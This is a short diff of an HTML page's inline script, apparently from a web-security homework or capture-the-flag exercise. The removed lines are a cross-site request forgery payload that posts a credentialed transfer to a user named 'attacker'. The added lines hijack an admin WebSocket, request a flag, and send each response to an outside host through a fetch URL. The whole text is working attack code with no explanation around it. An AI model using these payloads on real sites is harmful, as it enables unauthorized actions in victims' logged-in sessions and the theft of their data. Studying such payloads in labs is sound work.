@@ -6,13 +6,12 @@
     <body>
 
 <script>
-fetch("https://hw2p3.ckodser.ir/scriptisworking", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  },
-  body: "destination_username=attacker&quantity=10",
-  credentials: "include"
-});
+const ws = new WebSocket(`ws://${window.location.host}/admin/ws`, ['cookie']);
+ws.onopen = () => ws.send("flag");
+
+ws.onmessage = (event) => {
+  const response = event.data;
+  fetch(`https://hw2p3.ckodser.ir/scriptisworking#${response}`);
+};
 </script>
     </body>
